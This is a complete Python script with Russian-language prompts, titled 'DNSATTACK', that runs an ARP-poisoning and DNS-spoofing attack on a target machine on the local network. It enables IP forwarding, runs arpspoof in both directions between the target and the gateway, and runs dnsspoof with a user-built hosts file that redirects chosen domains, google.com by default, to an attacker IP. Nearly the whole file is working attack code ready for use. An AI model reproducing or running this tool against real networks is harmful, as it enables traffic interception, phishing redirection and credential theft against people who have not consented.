#!/usr/bin/env python3

from colorama import Fore, init
import subprocess
import threading
import time
import sys
import os

init(autoreset=True)

Warning = Fore.RED + "[!]" + Fore.RESET
Success = Fore.GREEN + "[+]" + Fore.RESET
Error = Fore.RED + "[-]" + Fore.RESET
Info = Fore.BLUE + "[*]" + Fore.RESET


def display_banner() -> None:
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(Fore.CYAN + f"""
    ██████████   ██████   █████  █████████    █████████   ███████████ ███████████   █████████     █████████  █████   ████ 
    ░░███░░░░███ ░░██████ ░░███  ███░░░░░███  ███░░░░░███ ░█░░░███░░░█░█░░░███░░░█  ███░░░░░███   ███░░░░░███░░███   ███░ 
    ░███   ░░███ ░███░███ ░███ ░███    ░░░  ░███    ░███ ░   ░███  ░ ░   ░███  ░  ░███    ░███  ███     ░░░  ░███  ███    
    ░███    ░███ ░███░░███░███ ░░█████████  ░███████████     ░███        ░███     ░███████████ ░███          ░███████     
    ░███    ░███ ░███ ░░██████  ░░░░░░░░███ ░███░░░░░███     ░███        ░███     ░███░░░░░███ ░███          ░███░░███    
    ░███    ███  ░███  ░░█████  ███    ░███ ░███    ░███     ░███        ░███     ░███    ░███ ░░███     ███ ░███ ░░███   
    ██████████   █████  ░░█████░░█████████  █████   █████    █████       █████    █████   █████ ░░█████████  █████ ░░████ 
    ░░░░░░░░░░   ░░░░░    ░░░░░  ░░░░░░░░░  ░░░░░   ░░░░░    ░░░░░       ░░░░░    ░░░░░   ░░░░░   ░░░░░░░░░  ░░░░░   ░░░░ 
    """)


def check_sudo() -> None:
    if os.geteuid() != 0:
        print(f"{Error} Этот скрипт требует права root!")
        sys.exit(1)


def check_tools() -> bool:
    result = subprocess.run(['which', 'arpspoof'], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"{Error} Отсутствует arpspoof!")
        print(f"{Info} Установите: sudo apt install dsniff")
        return False
    
    result = subprocess.run(['which', 'dnsspoof'], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"{Error} Отсутствует dnsspoof!")
        print(f"{Info} Установите: sudo apt install dsniff")
        return False
    
    return True


def get_network_info() -> tuple[str, str]:  
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'default via' in line:
                parts = line.split()
                gateway_ip = parts[2]
                interface = parts[4]
                return interface, gateway_ip
    except:
        pass
    
    print(f"{Error} Не удалось определить сетевые параметры!")
    interface = input(f"{Info} Введите сетевой адаптер (eth0, wlan0): ").strip()
    gateway_ip = input(f"{Info} Введите IP шлюза: ").strip()
    
    return interface, gateway_ip


def get_target_ip() -> str:
    while True:
        target_ip = input(f"{Info} Введите IP адрес цели: ").strip()
        if target_ip:
            if len(target_ip.split('.')) == 4:
                return target_ip
            else:
                print(f"{Error} Неверный формат IP адреса!")
        else:
            print(f"{Error} Пожалуйста, введите IP адрес!")


def create_hosts_file() -> None:
    print(f"\n{Info} Создание файла hosts.txt для DNS спуфинга...")
    
    hosts = []
    print(f"[!] Введите домены для подмены (пустая строка для завершения)")
    
    while True:
        domain = input(f"[!] Домен (например: google.com): ").strip().lower()
        if not domain:
            break
        
        ip = input(f"[!] IP для подмены (например: 192.168.1.100): ").strip()
        
        if ':' in ip:
            ip = ip.split(':')[0]
            print(f"{Warning} Удален порт из IP, используется: {ip}")
        
        if domain and ip:
            hosts.append(f"{ip} {domain}")
            hosts.append(f"{ip} www.{domain}")
            print(f"{Success} Добавлено: {domain} -> {ip}")
        else:
            print(f"{Error} Неверные данные!")
    
    if not hosts:
        hosts = ["192.168.1.100 google.com", "192.168.1.100 www.google.com"]
        print(f"{Warning} Используются домены по умолчанию")
    
    with open('hosts.txt', 'w') as f:
        for host in hosts:
            f.write(host + '\n')
    
    print(f"{Success} Создан файл hosts.txt")


def wait_for_enter() -> None:
    input(f"{Warning} Нажмите Enter для остановки...")


def start_dns_attack(interface: str, gateway: str, target_ip: str) -> None:
    print(f"\n{Success} Запуск DNS Spoofing атаки...")

    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        process1 = subprocess.Popen(['arpspoof', '-i', interface, '-t', target_ip, gateway],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process2 = subprocess.Popen(['arpspoof', '-i', interface, '-t', gateway, target_ip],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(2)
        
        process3 = subprocess.Popen(['dnsspoof', '-i', interface, '-f', 'hosts.txt'],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        start_time = time.time()
        
        enter_thread = threading.Thread(target=wait_for_enter)
        enter_thread.daemon = True
        enter_thread.start()
        
        enter_thread.join()
        
    except KeyboardInterrupt:
        print(f"\n{Info} Обнаружено прерывание...")
        
    finally:
        subprocess.run(['pkill', 'arpspoof'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['pkill', 'dnsspoof'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        subprocess.run(['arp', '-d', target_ip],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['arp', '-d', gateway],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if os.path.exists('hosts.txt'):
            os.remove('hosts.txt')
        
        duration = time.time() - start_time
        print(f"\n{Success} Атака завершена!")
        print(f"{Success} Длительность: {duration:.1f} секунд")


def main() -> None:
    display_banner()
    check_sudo()
    
    if not check_tools():
        sys.exit(1)
    
    print(f"{Info} Настройка DNS Spoofing атаки...")
    
    interface, gateway = get_network_info()
    target_ip = get_target_ip()
    
    create_hosts_file()
    
    print(f"\n{Warning} ПОДТВЕРЖДЕНИЕ АТАКИ")
    print(f"[!] Режим: DNS Spoofing")
    print(f"[!] Цель: {target_ip}")
    print(f"[!] Шлюз: {gateway}")
    print(f"[!] Сетевой адаптер: {interface}")
    
    confirm = input(f"\n{Info} Начать атаку? [y/N]: ").strip().lower()
    if confirm != 'y':
        print(f"{Success} Атака отменена!")
        sys.exit(0)
    
    start_dns_attack(interface, gateway, target_ip)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Success} Выход из программы...")
    except Exception as e:
        print(f"{Error} Ошибка: {e}")